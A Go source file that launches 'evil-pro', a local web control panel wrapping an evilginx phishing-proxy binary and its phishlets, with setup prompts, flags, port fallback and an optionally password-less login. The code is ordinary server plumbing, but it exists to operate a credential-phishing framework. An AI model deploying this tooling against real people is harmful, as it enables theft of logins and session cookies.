package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
)

const version = "1.1.0"

func banner(url, root string, hasPass bool, user string) {
	fmt.Println()
	fmt.Println("  evil-pro control panel  v" + version)
	fmt.Println("  ------------------------------------------------------------")
	fmt.Printf("  panel : %s\n", url)
	fmt.Printf("  folder: %s\n", root)
	if hasPass {
		fmt.Printf("  login : %s / (the password you set)\n", user)
	} else {
		fmt.Println("  login : OPEN (no password yet)")
		fmt.Println("          run SETUP.bat to set a login + port")
	}
	fmt.Println("  ------------------------------------------------------------")
	fmt.Println("  Ctrl+C to stop.")
	fmt.Println()
}

func openBrowser(url string) {
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("rundll32", "url.dll,FileProtocolHandler", url)
	case "darwin":
		cmd = exec.Command("open", url)
	default:
		cmd = exec.Command("xdg-open", url)
	}
	_ = cmd.Start()
}

// listenWithFallback binds addr; if the port is taken it tries the next ones.
func listenWithFallback(addr string) (net.Listener, string, error) {
	ln, err := net.Listen("tcp", addr)
	if err == nil {
		return ln, addr, nil
	}
	host, portStr, serr := net.SplitHostPort(addr)
	if serr != nil {
		return nil, addr, err
	}
	port, perr := strconv.Atoi(portStr)
	if perr != nil {
		return nil, addr, err
	}
	fmt.Printf("  port %d is in use (%v) - searching for a free port...\n", port, err)
	for i := 1; i <= 25; i++ {
		p := port + i
		a := net.JoinHostPort(host, strconv.Itoa(p))
		if ln, e := net.Listen("tcp", a); e == nil {
			return ln, a, nil
		}
	}
	return nil, addr, err
}

// one shared reader so piped input is not lost between prompts
var stdinReader = bufio.NewReader(os.Stdin)

func prompt(label, def string) string {
	fmt.Printf("  %s [%s]: ", label, def)
	line, err := stdinReader.ReadString('\n')
	if err != nil && line == "" {
		return def
	}
	if v := strings.TrimSpace(line); v != "" {
		return v
	}
	return def
}

func runSetup(st *Store) {
	set := st.Settings()
	fmt.Println()
	fmt.Println("  evil-pro control panel - first time setup")
	fmt.Println("  ----------------------------------------")
	fmt.Println("  (press Enter to keep the value in brackets)")
	fmt.Println()
	set.Bind = prompt("Listen address", orDefault(set.Bind, "127.0.0.1:8080"))
	set.User = prompt("Login username", orDefault(set.User, "admin"))
	pw := prompt("Login password (empty = no login)", set.Pass)
	set.Pass = pw
	fmt.Println()
	if err := st.SetSettings(set); err != nil {
		fmt.Println("  error saving:", err)
		pause()
		return
	}
	fmt.Printf("  saved to %s\n", st.Path())
	fmt.Println("  start the panel with START.bat")
	fmt.Println()
	pause()
}

func orDefault(v, def string) string {
	if strings.TrimSpace(v) == "" {
		return def
	}
	return v
}

func pause() {
	if runtime.GOOS == "windows" {
		fmt.Print("  press Enter to close...")
		_, _ = stdinReader.ReadString('\n')
	}
}

func main() {
	fs := flag.NewFlagSet("evilpro-panel", flag.ExitOnError)
	bind := fs.String("bind", "", "listen address, e.g. 127.0.0.1:8080 or 0.0.0.0:9000 (default from panel.json)")
	user := fs.String("user", "", "panel username (default from panel.json)")
	pass := fs.String("pass", "", "panel password (default from panel.json; empty = open)")
	repo := fs.String("repo", "", "folder holding evilginx-linux + phishlets (default: this folder)")
	open := fs.Bool("open", true, "open the browser")
	doSetup := fs.Bool("setup", false, "interactive first-time setup")
	showVer := fs.Bool("v", false, "print version and exit")
	tlsCert := fs.String("tls-cert", "", "optional TLS certificate")
	tlsKey := fs.String("tls-key", "", "optional TLS key")
	_ = fs.Parse(os.Args[1:])

	if *showVer {
		fmt.Println("evil-pro control panel v" + version)
		return
	}
	log.SetFlags(0)

	st, err := NewStore()
	if err != nil {
		log.Fatalf("settings: %v", err)
	}
	if *doSetup {
		runSetup(st)
		return
	}

	set := st.Settings()
	// explicit flags win, otherwise panel.json is used
	fs.Visit(func(f *flag.Flag) {
		switch f.Name {
		case "bind":
			set.Bind = *bind
		case "user":
			set.User = *user
		case "pass":
			set.Pass = *pass
		case "repo":
			set.RepoDir = *repo
			set.BinAmd64 = filepath.Join(*repo, "evilginx-linux")
			set.BinArm64 = filepath.Join(*repo, "evilginx-linux-arm64")
		}
	})
	// The repo/portable root can be wrong: some launchers split a -repo path on
	// its spaces, and a folder can be moved. Only trust it if it actually looks
	// like the project, otherwise fall back to a location that does. Without this
	// the extension zip and phishlet folder resolve to the wrong parent.
	set.RepoDir = resolveRepo(set.RepoDir)
	for _, b := range []*string{&set.BinAmd64, &set.BinArm64} {
		if fileExists(*b) {
			continue
		}
		if p := filepath.Join(set.RepoDir, filepath.Base(*b)); fileExists(p) {
			*b = p
		}
	}
	if set.Bind == "" {
		set.Bind = "127.0.0.1:8080"
	}
	if set.User == "" {
		set.User = "admin"
	}
	_ = st.SetSettings(set)

	app := NewApp(st, set.User, set.Pass)

	ln, actual, err := listenWithFallback(set.Bind)
	if err != nil {
		fmt.Printf("\n  could not listen on %s: %v\n", set.Bind, err)
		pause()
		os.Exit(1)
	}
	if actual != set.Bind {
		set.Bind = actual
		_ = st.SetSettings(set)
	}
	app.bindAddr = actual

	host := actual
	urlHost := host
	if strings.HasPrefix(host, "0.0.0.0:") {
		urlHost = "127.0.0.1:" + strings.TrimPrefix(host, "0.0.0.0:")
	} else if strings.HasPrefix(host, "[::]:") {
		urlHost = "127.0.0.1:" + strings.TrimPrefix(host, "[::]:")
	}
	scheme := "http"
	if *tlsCert != "" && *tlsKey != "" {
		scheme = "https"
	}
	url := scheme + "://" + urlHost
	banner(url, appRoot(), app.authEnabled(), set.User)

	srv := &http.Server{
		Handler:           app.buildMux(),
		ReadHeaderTimeout: 15 * time.Second,
		IdleTimeout:       120 * time.Second,
	}

	if *open {
		go func() { time.Sleep(500 * time.Millisecond); openBrowser(url) }()
	}
	go func() {
		var e error
		if *tlsCert != "" && *tlsKey != "" {
			e = srv.ServeTLS(ln, *tlsCert, *tlsKey)
		} else {
			e = srv.Serve(ln)
		}
		if e != nil && e != http.ErrServerClosed {
			log.Fatalf("serve: %v", e)
		}
	}()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt, syscall.SIGTERM)
	<-sig
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	_ = srv.Shutdown(ctx)
	fmt.Println("bye.")
}
